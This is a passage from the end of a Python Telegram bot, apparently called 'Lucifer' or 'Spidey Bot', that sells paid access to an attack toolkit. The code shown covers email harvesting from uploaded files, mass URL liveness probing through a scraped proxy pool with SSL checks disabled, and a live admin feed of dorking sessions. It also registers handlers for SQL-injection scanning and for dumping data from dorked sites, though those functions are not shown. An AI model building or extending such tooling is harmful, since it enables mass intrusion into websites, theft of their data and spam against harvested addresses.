        return

    ts      = datetime.now().strftime("%d%m%y_%H%M")
    content = "\n".join(kws).encode("utf-8")
    await query.message.reply_document(
        document=io.BytesIO(content),
        filename=f"lucifer_keywords_{len(kws)}_{ts}.txt",
        caption=(
            f"⚔️ *AI Keywords Generated*\n"
            f"├ 🤖 Provider: `{_label}`\n"
            f"├ 🔑 Total: `{len(kws):,}`\n"
            f"├ 🎯 Topic: `{prompt[:40]}`\n"
            f"└ ⚔️ Lᴜᴄɪꜰᴇʀ AI"
        ),
        parse_mode=ParseMode.MARKDOWN,
    )
    await query.delete_message()

# ── /apikeys, /setkey, /delkey — AI keys config ─────────────────────────
async def apikeys_cmd(update, ctx):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("❌ Admin only.")
        return
    await update.message.reply_text(
        _ai_keys_status_text(),
        reply_markup=make_ai_keys_kb(),
        parse_mode=ParseMode.MARKDOWN,
    )

async def setkey_cmd(update, ctx):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("❌ Admin only.")
        return
    args = ctx.args or []
    if len(args) < 2:
        await update.message.reply_text(
            "⚔️ *AI Key Setup*\n\n"
            "Usage: `/setkey <provider> <api_key>`\n\n"
            "Providers:\n"
            "• `gemini` (Google Gemini)\n"
            "• `anthropic` (Claude)\n"
            "• `openrouter` (GPT-4o, LLaMA, DeepSeek)\n\n"
            "Example:\n"
            "`/setkey gemini AIzaSy...`",
            reply_markup=make_ai_keys_kb(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return
    prov = args[0].lower().strip()
    key = args[1].strip()
    if prov not in ("anthropic", "gemini", "openrouter"):
        await update.message.reply_text("❌ Invalid provider. Use `gemini`, `anthropic`, or `openrouter`.", parse_mode=ParseMode.MARKDOWN)
        return
    _save_ai_key(prov, key)
    masked = key[:6] + "..." + key[-4:] if len(key) > 10 else "***"
    await update.message.reply_text(
        f"✅ *{prov.title()} API Key Saved!*\n\n"
        f"🔑 Key: `{masked}`\n"
        f"💾 Saved to `ai_keys.json` & immediately active in bot.",
        reply_markup=make_ai_keys_kb(),
        parse_mode=ParseMode.MARKDOWN,
    )

async def delkey_cmd(update, ctx):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("❌ Admin only.")
        return
    args = ctx.args or []
    if not args:
        await update.message.reply_text("Usage: `/delkey <anthropic|gemini|openrouter|all>`", parse_mode=ParseMode.MARKDOWN)
        return
    prov = args[0].lower().strip()
    if prov == "all":
        _save_ai_key("anthropic", "")
        _save_ai_key("gemini", "")
        _save_ai_key("openrouter", "")
        await update.message.reply_text("🗑️ All AI keys cleared.", reply_markup=make_ai_keys_kb())
        return
    if prov not in ("anthropic", "gemini", "openrouter"):
        await update.message.reply_text("❌ Invalid provider. Use: `anthropic`, `gemini`, `openrouter`, or `all`", parse_mode=ParseMode.MARKDOWN)
        return
    _save_ai_key(prov, "")
    await update.message.reply_text(f"🗑️ {prov.title()} key cleared.", reply_markup=make_ai_keys_kb())

async def emails_cmd(update, ctx):
    if not has_access(update.effective_user.id):
        await update.message.reply_text("❌ Access denied.")
        return
    doc = None
    if update.message.reply_to_message and update.message.reply_to_message.document:
        doc = update.message.reply_to_message.document
    elif update.message.document:
        doc = update.message.document
    if not doc:
        await update.message.reply_text(
            "📎 Reply to a `.txt` file with `/emails` to harvest emails.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return
    msg = await update.message.reply_text("📧 Extracting emails...")
    f   = await ctx.bot.get_file(doc.file_id)
    raw = await f.download_as_bytearray()
    text = raw.decode("utf-8", errors="ignore")
    emails = _extract_emails(text)
    if not emails:
        await msg.edit_text("❌ No emails found in file.")
        return
    ts = datetime.now().strftime("%d%m%y_%H%M")
    content = "\n".join(emails).encode("utf-8")
    await msg.delete()
    await update.message.reply_document(
        document=io.BytesIO(content),
        filename=f"lucifer_emails_{len(emails)}_{ts}.txt",
        caption=(
            f"⚔️ Eᴍᴀɪʟ Hᴀʀᴠᴇsᴛ Rᴇsᴜʟᴛ\n"
            f"├ 📧 Total: `{len(emails):,}`\n"
            f"└ 🌑 Lᴜᴄɪꜰᴇʀ Bᴏᴛ"
        ),
        parse_mode=ParseMode.MARKDOWN,
    )

# ── /livefeed — admin sees all active sessions ───────────────────────────
async def livefeed_cmd(update, ctx):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("❌ Admin only.")
        return
    if not _LIVE_FEED:
        await update.message.reply_text("💤 No active sessions right now.")
        return
    lines = ["⚔️━━━━━━━━━━━━━━━━━━━━⚔️", "👁️ 𝗟𝗜𝗩𝗘 𝗙𝗘𝗘𝗗", "⚔️━━━━━━━━━━━━━━━━━━━━⚔️\n"]
    for i, (sid, s) in enumerate(_LIVE_FEED.items(), 1):
        lines.append(
            f"*{i}. {s.get('name','?')}* (`{sid}`)\n"
            f"  {s.get('phase','?')} | Started: `{s.get('start','?')}`\n"
            f"  Dorks: `{s.get('dorks_done',0):,}/{s.get('dorks_total',0):,}` "
            f"| URLs: `{s.get('urls_found',0):,}`\n"
        )
    await update.message.reply_text(
        "\n".join(lines),
        parse_mode=ParseMode.MARKDOWN,
    )

# ── /statuscheck — filter URLs by HTTP status ────────────────────────────
async def statuscheck_cmd(update, ctx):
    if not has_access(update.effective_user.id):
        await update.message.reply_text("❌ Access denied.")
        return
    doc = None
    if update.message.reply_to_message and update.message.reply_to_message.document:
        doc = update.message.reply_to_message.document
    elif update.message.document:
        doc = update.message.document
    if not doc:
        await update.message.reply_text(
            "📎 Reply to a URLs `.txt` file with `/statuscheck`\n"
            "Filters: keeps only HTTP 200/301/302/500 URLs.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return
    msg = await update.message.reply_text("⚡ Checking URL statuses...")
    raw  = await (await ctx.bot.get_file(doc.file_id)).download_as_bytearray()
    urls = [l.strip() for l in raw.decode("utf-8", errors="ignore").splitlines() if l.strip().startswith("http")]
    if not urls:
        await msg.edit_text("❌ No URLs found in file.")
        return
    await msg.edit_text(f"⚡ Checking `{len(urls):,}` URLs...")
    _live_urls, _dead = [], 0
    _sem = asyncio.Semaphore(200)
    async def _chk(url):
        nonlocal _dead
        async with _sem:
            try:
                async with aiohttp.ClientSession() as _s:
                    async with _s.get(url, timeout=aiohttp.ClientTimeout(total=6),
                                     allow_redirects=True, ssl=False) as _r:
                        if _r.status in (200, 201, 301, 302, 403, 500):
                            _live_urls.append(url)
                        else:
                            _dead += 1
            except Exception:
                _dead += 1
    await asyncio.gather(*[_chk(u) for u in urls], return_exceptions=True)
    if not _live_urls:
        await msg.edit_text("❌ No live URLs found.")
        return
    ts = datetime.now().strftime("%d%m%y_%H%M")
    content = "\n".join(_live_urls).encode("utf-8")
    await msg.delete()
    await update.message.reply_document(
        document=io.BytesIO(content),
        filename=f"lucifer_live_{len(_live_urls)}_{ts}.txt",
        caption=(
            f"⚔️ Sᴛᴀᴛᴜs Fɪʟᴛᴇʀ Rᴇsᴜʟᴛ\n"
            f"├ ✅ Live: `{len(_live_urls):,}`\n"
            f"├ ❌ Dead: `{_dead:,}`\n"
            f"└ ⚔️ Lᴜᴄɪꜰᴇʀ Bᴏᴛ"
        ),
        parse_mode=ParseMode.MARKDOWN,
    )


# ── MAIN ───────────────────────────────────────────────────────────────────────

def main():
    if not TOKEN:
        logger.error("TOKEN not set!")
        return

    import signal as _sig, subprocess as _sub
    _my_pid = os.getpid()
    try:
        _procs = _sub.check_output(["pgrep", "-f", "python3 main.py"], text=True).split()
        for _p in _procs:
            _p = int(_p.strip())
            if _p != _my_pid:
                try:
                    os.kill(_p, _sig.SIGKILL)
                    logger.info("🔪 Kɪʟʟᴇᴅ Oʟᴅ Iɴsᴛᴀɴᴄᴇ PID %s", _p)
                except Exception:
                    pass
        if _procs:
            time.sleep(2)
    except Exception:
        pass

    _request = HTTPXRequest(
        connection_pool_size=64,
        connect_timeout=10.0,
        read_timeout=30.0,
        write_timeout=30.0,
        pool_timeout=15.0,
    )
    _updater_request = HTTPXRequest(
        connection_pool_size=16,
        connect_timeout=10.0,
        read_timeout=30.0,
        write_timeout=30.0,
        pool_timeout=15.0,
    )
    app = (
        Application.builder()
        .token(TOKEN)
        .request(_request)
        .get_updates_request(_updater_request)
        .concurrent_updates(512)
        .build()
    )

    admin_cmds = [
        CommandHandler("admin",      admin_cmd),
        CommandHandler("genkey",     genkey_cmd),
        CommandHandler("listkeys",   listkeys_cmd),
        CommandHandler("users",      users_cmd),
        CommandHandler("stats",      stats_cmd),
        CommandHandler("revokekey",  revokekey_cmd),
        CommandHandler("adduser",    adduser_cmd),
        CommandHandler("getfile",    getfile_cmd),
        CommandHandler("removeuser", removeuser_cmd),
        CommandHandler("checkuser",  checkuser_cmd),
        CommandHandler("broadcast",  broadcast_cmd),
        CommandHandler("banuser",    banuser_cmd),
        CommandHandler("unbanuser",  unbanuser_cmd),
        CommandHandler("gproxy",     gproxy_cmd),
        CommandHandler("gproxies",   gproxy_cmd),
        CommandHandler("apikeys",    apikeys_cmd),
        CommandHandler("aikeys",     apikeys_cmd),
        CommandHandler("setkey",     setkey_cmd),
        CommandHandler("setai",      setkey_cmd),
        CommandHandler("delkey",     delkey_cmd),
    ]

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start), *admin_cmds],
        states={
            MENU: [CallbackQueryHandler(button_handler), *admin_cmds],
            KW_WAIT_COUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, kw_get_count),
                CallbackQueryHandler(button_handler),
            ],
            KW_WAIT_SEEDS: [
                MessageHandler(filters.Document.FileExtension("txt"), kw_get_seeds_file),
                MessageHandler(filters.TEXT & ~filters.COMMAND, kw_get_seeds_text),
                CallbackQueryHandler(button_handler),
            ],
            DORK_WAIT_COUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, dork_get_count),
                CallbackQueryHandler(button_handler),
            ],
            DORK_WAIT_KEYWORDS: [
                MessageHandler(filters.Document.FileExtension("txt"), dork_get_keywords_file),
                MessageHandler(filters.TEXT & ~filters.COMMAND, dork_get_keywords_text),
                CallbackQueryHandler(button_handler),
            ],
            PARSER_WAIT_DORKS: [
                MessageHandler(filters.Document.FileExtension("txt"), parser_get_dorks_file),
                MessageHandler(filters.TEXT & ~filters.COMMAND, parser_get_dorks_text),
                CallbackQueryHandler(button_handler),
            ],
            PURCHASE_MENU: [CallbackQueryHandler(purchase_menu_handler)],
            REDEEM_WAIT_KEY: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, redeem_key),
                CallbackQueryHandler(button_handler),
            ],
            SQLI_WAIT_URLS: [
                MessageHandler(filters.Document.FileExtension("txt"), sqli_get_urls_file),
                MessageHandler(filters.TEXT & ~filters.COMMAND, sqli_get_urls_text),
                CallbackQueryHandler(button_handler),
            ],
            DUMP_WAIT_DORKS: [
                MessageHandler(filters.Document.FileExtension("txt"), dump_get_dorks_file),
                MessageHandler(filters.TEXT & ~filters.COMMAND, dump_get_dorks_text),
                CallbackQueryHandler(button_handler),
            ],
            URL_DUMP_WAIT: [
                MessageHandler(filters.Document.FileExtension("txt"), url_dump_get_file),
                MessageHandler(filters.TEXT & ~filters.COMMAND, url_dump_get_text),
                CallbackQueryHandler(button_handler),
            ],
            GDORK_DUMP_WAIT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, gdork_dump_handler),
                CallbackQueryHandler(button_handler),
            ],
        },
        fallbacks=[
            CommandHandler("start", start),
            *admin_cmds,
            MessageHandler(filters.TEXT & ~filters.COMMAND, fallback),
        ],
        allow_reentry=True,
    )

    app.add_handler(conv)

    # ── Pro Dork Generator — standalone ConversationHandlers ──────────────────
    app.add_handler(_adork_make_conv("dkeywords",  _ADORK_WAIT_KEYWORDS,  adork_keywords_cmd,  _adork_kw_file, _adork_kw_text))
    app.add_handler(_adork_make_conv("ddomains",   _ADORK_WAIT_DOMAINS,   adork_domains_cmd,   _adork_de_file, _adork_de_text))
    app.add_handler(_adork_make_conv("dparams",    _ADORK_WAIT_PARAMS,    adork_params_cmd,    _adork_nb_file, _adork_nb_text))
    app.add_handler(_adork_make_conv("dfiletypes", _ADORK_WAIT_FILETYPES, adork_filetypes_cmd, _adork_pt_file, _adork_pt_text))
    app.add_handler(_adork_make_conv("dsf",        _ADORK_WAIT_SF,        adork_sf_cmd,        _adork_sf_file, _adork_sf_text))
    app.add_handler(_adork_make_conv("dpf",        _ADORK_WAIT_PF,        adork_pf_cmd,        _adork_pf_file, _adork_pf_text))

    app.add_handler(CommandHandler("dconfig",   adork_config_cmd))
    app.add_handler(CommandHandler("dstatus",   adork_status_cmd))
    app.add_handler(CommandHandler("dreset",    adork_reset_cmd))
    app.add_handler(CommandHandler("dgenerate", adork_generate_cmd))
    app.add_handler(CommandHandler("dgen",      adork_gen_n_cmd))

    # ── Proxy commands ─────────────────────────────────────────────────────────
    app.add_handler(CommandHandler("aigen",        aigen_cmd))
    app.add_handler(CommandHandler("apikeys",      apikeys_cmd))
    app.add_handler(CommandHandler("aikeys",       apikeys_cmd))
    app.add_handler(CommandHandler("setkey",       setkey_cmd))
    app.add_handler(CommandHandler("setai",        setkey_cmd))
    app.add_handler(CommandHandler("delkey",       delkey_cmd))
    app.add_handler(CallbackQueryHandler(
        aigen_callback,
        pattern=r"^aigen_(anthropic|gemini|gpt4o|mistral|llama|deepseek)$"
    ))
    app.add_handler(CommandHandler("emails",       emails_cmd))
    app.add_handler(CommandHandler("harvestemails", emails_cmd))
    app.add_handler(CommandHandler("livefeed",     livefeed_cmd))
    app.add_handler(CommandHandler("statuscheck",  statuscheck_cmd))
    app.add_handler(CommandHandler("scfilter",     statuscheck_cmd))

    app.add_handler(CommandHandler("setpr",   setpr_cmd))
    app.add_handler(CommandHandler("delpr",   setpr_cmd))
    app.add_handler(CommandHandler("proxies", setpr_cmd))

    # ── Load persistent data ────────────────────────────────────────────────────
    _load_proxies()
    _load_bans()
    _load_auth()
    _load_users()
    _load_scanned()
    logger.info("✅ Lᴏᴀᴅᴇᴅ Pʀᴏxɪᴇs, Bᴀɴs, Aᴜᴛʜs and Usᴇʀs Fʀᴏᴍ Dɪsᴋ")

    logger.info("💀 Sᴘɪᴅᴇʏ Bᴏᴛ v1 Sᴛᴀʀᴛᴇᴅ — Uʟᴛɪᴍᴀᴛᴇ Eᴅɪᴛɪᴏɴ")

    # ── Keep-alive HTTP server ─────────────────────────────────────────────────
    from aiohttp import web as _web

    async def _health(_req):
        return _web.Response(text="Sᴘɪᴅᴇʏ Bᴏᴛ Is Aʟɪᴠᴇ ✅")

    async def _run_keepalive():
        _runner = _web.AppRunner(_web.Application())
        _runner.app.router.add_get("/",       _health)
        _runner.app.router.add_get("/health", _health)
        await _runner.setup()
        _port = int(os.environ.get("PORT", 3000))
        site  = _web.TCPSite(_runner, "0.0.0.0", _port)
        await site.start()
        logger.info("🚄 Kᴇᴇᴘ-Aʟɪᴠᴇ Sᴇʀᴠᴇʀ Sᴛᴀʀᴛᴇᴅ Oɴ Pᴏʀᴛ %s", _port)

    async def _self_ping():
        import aiohttp as _aiohttp
        _port = int(os.environ.get("PORT", 3000))
        _url  = f"http://127.0.0.1:{_port}/health"
        await asyncio.sleep(30)
        while True:
            try:
                async with _aiohttp.ClientSession() as _s:
                    await _s.get(_url, timeout=_aiohttp.ClientTimeout(total=5))
            except Exception:
                pass
            await asyncio.sleep(240)

    async def _auto_save():
        """Background task: save all user data every 60 seconds."""
        while True:
            await asyncio.sleep(60)
            try:
                _save_auth()
                _save_users()
                _save_bans()
                _save_proxies()
            except Exception:
                pass

    async def _auto_proxy_cleaner():
        """Background: every 10 min — scrape + recheck — remove dead proxies."""
        await asyncio.sleep(90)
        while True:
            try:
                _raw_c = await _scrape_fresh_proxies()
                _parsed_c = [_parse_proxy(p) for p in _raw_c if p]
                _combined_c = list(dict.fromkeys(global_proxy_pool + _parsed_c))
                _live_c = await check_proxies_bulk(_combined_c, timeout=6.0, concurrency=200)
                global_proxy_pool.clear()
                global_proxy_pool.extend(_live_c)
                _save_proxies()
                logger.info("🔄 Auto cleaner: %d live proxies in pool", len(global_proxy_pool))
            except Exception as _e:
                logger.warning("Auto proxy cleaner: %s", _e)
            await asyncio.sleep(600)

    async def _run_bot():
        async with app:
            await app.start()
            await app.updater.start_polling(drop_pending_updates=True)
            logger.info("🕷️ Bᴏᴛ Pᴏʟʟɪɴɢ Sᴛᴀʀᴛᴇᴅ")
            await asyncio.Event().wait()
            await app.updater.stop()
            await app.stop()

    async def _run_all():
        await asyncio.gather(_run_keepalive(), _self_ping(), _run_bot(), _auto_save(), _auto_proxy_cleaner())

    asyncio.run(_run_all())


if __name__ == "__main__":
    main()
